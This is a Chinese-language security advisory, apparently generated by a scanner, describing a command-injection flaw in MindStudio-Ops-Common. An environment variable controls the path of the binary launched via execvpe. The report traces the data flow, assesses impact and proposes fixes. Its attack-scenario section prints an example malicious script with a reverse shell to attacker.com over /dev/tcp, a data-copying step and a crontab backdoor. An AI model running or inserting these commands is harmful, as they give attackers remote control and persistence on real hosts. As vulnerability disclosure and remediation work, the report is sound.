# VULN-runtime-001：SimulatorLauncher.Launch execvpe命令注入致任意代码执行

## 漏洞基本信息

| 属性 | 值 |
|------|-----|
| **漏洞 ID** | VULN-runtime-001 |
| **漏洞类型** | Command Injection（命令注入） |
| **CWE 编号** | CWE-78 |
| **严重等级** | High（高危） |
| **置信度** | 75% |
| **发现位置** | `csrc/runtime/inject_helpers/ProfDataCollect.cpp:439-444` |
| **函数名称** | `SimulatorLauncher::Launch` |
| **代码片段** | `const pid_t pid {fork()}; ... execvpe(kernelLaunchBinPath_.c_str(), argumentsOutput.data(), ToRawCArgv(envs).data());` |

## 漏洞描述

`SimulatorLauncher::Launch()` 函数使用 `fork()` + `execvpe()` 执行外部 kernel launcher 工具。执行路径 `kernelLaunchBinPath_` 通过环境变量 `MSOPPROF_EXE_PATH_ENV` 获取，攻击者如果能控制该环境变量，可以指定任意可执行文件路径，导致执行恶意程序。这是典型的环境变量驱动的命令注入漏洞。

## 漏洞触发条件分析

### 触发条件
1. **环境变量 `MSOPPROF_EXE_PATH_ENV` 可被控制**：攻击者需要能设置该环境变量
2. **攻击者需准备恶意可执行文件**：文件路径需要与环境变量指向的路径匹配
3. **SimulatorLauncher::Launch() 被调用**：需要有触发条件（如性能数据收集）

### 数据流追踪

```
[数据流路径]
┌─────────────────────────────────────────────────────────────────────┐
│ Source: 环境变量 MSOPPROF_EXE_PATH_ENV                              │
│                                                                     │
│ ┌──────────────────────────────────────────────────────────────┐   │
│ │ GetEnv(MSOPPROF_EXE_PATH_ENV)                                │   │
│ │   → 从环境变量获取值                                         │   │
│ │   → 【无验证】                                               │   │
│ └──────────────────────────────────────────────────────────────┘   │
│         ↓                                                           │
│ ┌──────────────────────────────────────────────────────────────┐   │
│ │ ProfConfig::GetMsopprofPath()                                │   │
│ │   → return msoptPath                                         │   │
│ └──────────────────────────────────────────────────────────────┘   │
│         ↓                                                           │
│ ┌──────────────────────────────────────────────────────────────┐   │
│ │ SimulatorLauncher 构造函数                                   │   │
│ │   → kernelLaunchBinPath_ = GetMsopprofPath() + "/bin..."     │   │
│ └──────────────────────────────────────────────────────────────┘   │
│         ↓                                                           │
│ ┌──────────────────────────────────────────────────────────────┐   │
│ │ SimulatorLauncher::Launch()                                  │   │
│ │   → fork()                                                   │   │
│ │   → execvpe(kernelLaunchBinPath_.c_str(), args, envs)        │   │
│ │   → 【SINK】执行任意程序                                     │   │
│ └──────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

### 关键代码片段

**ProfDataCollect.cpp:439-451 (Launch 函数)**
```cpp
void SimulatorLauncher::Launch(const std::string &dumpPath, uint64_t launchId, bool aclNew)
{
    std::string outputDir = JoinPath({dumpPath, "kernel_data"});
    // ...
    std::vector<std::string> envs = SetEnvToSimu(dumpPath);
    std::vector<std::string> args = GetLaunchArgs(outputDir);
    std::vector<char *> argumentsOutput = ToRawCArgv(args);
    const pid_t pid {fork()};
    if (pid < 0) {
        WARN_LOG("Fork kernel-launcher process failed");
    } else if (pid == 0) {
        // 【漏洞点】kernelLaunchBinPath_ 可被环境变量控制
        execvpe(kernelLaunchBinPath_.c_str(), argumentsOutput.data(), ToRawCArgv(envs).data());
        _exit(EXIT_FAILURE);
    } else {
        int status;
        waitpid(pid, &status, 0);
        // ...
    }
}
```

**ProfConfig.cpp:279-289 (路径来源)**
```cpp
std::string ProfConfig::GetMsopprofPath() const
{
    std::string msoptPath = GetEnv(MSOPPROF_EXE_PATH_ENV);
    if (!msoptPath.empty()) {
        return msoptPath;  // 【无验证直接返回】
    }
    WARN_LOG("Can not get msopt path by env.");
    std::string ascendHomePath;
    if (!GetAscendHomePath(ascendHomePath)) {
        return "";
    }
    // ...
}
```

### kernelLaunchBinPath_ 的初始化

根据项目代码，`kernelLaunchBinPath_` 在 SimulatorLauncher 构造函数中被设置，其值来源于：
```cpp
// 伪代码示意
kernelLaunchBinPath_ = ProfConfig::Instance().GetMsopprofPath() + "/bin/kernel-launcher";
```

如果 `MSOPPROF_EXE_PATH_ENV` 被设置为 `/tmp/attacker`，则 `kernelLaunchBinPath_` 变为 `/tmp/attacker/bin/kernel-launcher`。

## 潜在攻击场景

### 场景 1: 环境变量劫持攻击

**攻击步骤**：
1. 攻击者在运行环境中设置环境变量：
   ```bash
   export MSOPPROF_EXE_PATH_ENV=/tmp/attacker
   ```
2. 攻击者在 `/tmp/attacker/bin/` 目录放置恶意程序 `kernel-launcher`
3. 当性能数据收集功能触发时，`SimulatorLauncher::Launch()` 执行恶意程序

**恶意程序示例**：
```bash
#!/bin/bash
# /tmp/attacker/bin/kernel-launcher

# 窃取数据
cp -r /home/user/sensitive_data /tmp/attacker/exfil

# 反弹 shell
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# 植入后门
echo "* * * * * /tmp/attacker/backdoor.sh" >> /etc/crontab
```

### 场景 2: 开发维测环境攻击

**攻击条件**：
- MindStudio-Ops-Common 主要用于开发维测环境
- 开发环境通常权限较高，环境变量可被开发者修改

**攻击方式**：
- 开发者在调试时设置错误的环境变量
- 或恶意开发者利用开发权限执行攻击
- CI/CD 环境中环境变量可能被配置错误

### 场景 3: 容器/虚拟化环境攻击

**攻击条件**：
- 如果 msOpProf 在容器中运行
- 容器环境变量可能被编排文件或 Kubernetes ConfigMap 控制

**攻击方式**：
- 修改容器配置注入恶意 `MSOPPROF_EXE_PATH_ENV`
- 通过容器逃逸获得宿主机权限

### 场景 4: 符号链接攻击

**攻击步骤**：
1. 攻击者替换合法目录中的 `kernel-launcher` 二进制文件
2. 或创建符号链接指向恶意程序
3. `execvpe` 执行恶意版本

## 影响范围评估

### 直接影响
| 影面 | 影响描述 |
|------|----------|
| **代码执行** | 执行任意程序，继承进程权限 |
| **数据窃取** | 恶意程序可读取敏感文件 |
| **权限提升** | 如果父进程有特权，子进程继承 |
| **持久化** | 植入后门程序 |

### 风险等级
- **CWE-78**: OS 命令注入 - 通过控制执行路径实现
- **CWE-77**: 命令注入 - 参数/路径被攻击者控制
- **置信度 75%**: 环境变量控制需要特定权限，降低了置信度

### 受影响组件
| 文件 | 角色 |
|------|------|
| `csrc/runtime/inject_helpers/ProfDataCollect.cpp` | 漏洞点 - execvpe 调用 |
| `csrc/runtime/inject_helpers/ProfConfig.cpp` | 来源 - 环境变量获取 |
| `csrc/utils/FileSystem.cpp` | GetEnv 函数 |
| `csrc/utils/Environment.cpp` | 环境变量处理 |

### 信任边界分析
- **Environment Variable Interface**: User Environment → Injection Library (风险: Medium)
- 环境变量通常由可信用户设置，但在某些场景可能被攻击者控制

## 修复建议

### 建议 1: 环境变量路径验证（推荐）

```cpp
std::string ProfConfig::GetMsopprofPath() const
{
    std::string msoptPath = GetEnv(MSOPPROF_EXE_PATH_ENV);
    if (!msoptPath.empty()) {
        // 【新增】路径验证
        std::string realPath;
        if (!Realpath(msoptPath, realPath)) {
            WARN_LOG("Cannot resolve MSOPPROF_EXE_PATH_ENV path: %s", msoptPath.c_str());
            return "";
        }
        
        // 【新增】白名单目录检查
        std::string ascendHomePath;
        if (!GetAscendHomePath(ascendHomePath)) {
            WARN_LOG("Cannot get ASCEND_HOME_PATH for validation");
            return "";
        }
        
        // 只允许在 ASCEND_HOME_PATH 目录下
        if (realPath.find(ascendHomePath) != 0) {
            WARN_LOG("MSOPPROF path outside allowed directory: %s", realPath.c_str());
            return "";
        }
        
        return realPath;
    }
    // 回退到默认路径
    WARN_LOG("Can not get msopt path by env.");
    std::string ascendHomePath;
    if (!GetAscendHomePath(ascendHomePath)) {
        return "";
    }
    // ...
}
```

### 建议 2: 执行路径硬编码（最安全）

```cpp
// 在 SimulatorLauncher 构造函数中
SimulatorLauncher::SimulatorLauncher() {
    // 【修改】硬编码可信路径，忽略环境变量
    std::string ascendHomePath;
    if (!GetAscendHomePath(ascendHomePath)) {
        ERROR_LOG("Cannot get ASCEND_HOME_PATH");
        return;
    }
    
    // 唯一可信路径
    kernelLaunchBinPath_ = JoinPath({ascendHomePath, "bin", "kernel-launcher"});
    
    // 【新增】验证文件存在且签名有效
    if (!FileExists(kernelLaunchBinPath_)) {
        ERROR_LOG("kernel-launcher not found at expected path");
        return;
    }
}
```

### 建议 3: 二进制签名验证

```cpp
void SimulatorLauncher::Launch(...) {
    // ...
    
    // 【新增】执行前验证二进制签名
    if (!VerifyBinarySignature(kernelLaunchBinPath_)) {
        ERROR_LOG("kernel-launcher signature verification failed");
        return;
    }
    
    const pid_t pid {fork()};
    // ...
}
```

### 建议 4: 权限降级

```cpp
void SimulatorLauncher::Launch(...) {
    const pid_t pid {fork()};
    if (pid < 0) {
        WARN_LOG("Fork failed");
    } else if (pid == 0) {
        // 【新增】子进程降权执行
        if (geteuid() != getuid()) {
            setuid(getuid());  // 降为真实用户权限
        }
        
        // 【新增】限制能力
        prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
        
        execvpe(kernelLaunchBinPath_.c_str(), args, envs);
        _exit(EXIT_FAILURE);
    }
    // ...
}
```

### 建议 5: 审计日志

```cpp
void SimulatorLauncher::Launch(...) {
    // 【新增】记录执行审计
    AUDIT_LOG("Launcher executing: path=%s, args=%s, caller_uid=%d",
              kernelLaunchBinPath_.c_str(), 
              JoinArgs(args).c_str(), 
              getuid());
    
    const pid_t pid {fork()};
    // ...
}
```

## 验证测试建议

### 安全测试用例
| 测试项 | 测试方法 |
|--------|----------|
| 环境变量注入 | 设置 `MSOPPROF_EXE_PATH_ENV=/tmp/malicious` |
| 路径遍历 | 设置 `MSOPPROF_EXE_PATH_ENV=../../../tmp` |
| 符号链接 | 创建符号链接替换合法二进制 |
| 权限边界 | 测试在低权限用户下是否能执行 |

### 检测建议
- 监控 `MSOPPROF_EXE_PATH_ENV` 环境变量的异常值
- 使用 auditd 记录 execvpe 调用
- 实施最小权限原则

---

**报告生成时间**: 2026-04-21  
**分析工具**: MindStudio-Ops-Common 漏洞扫描器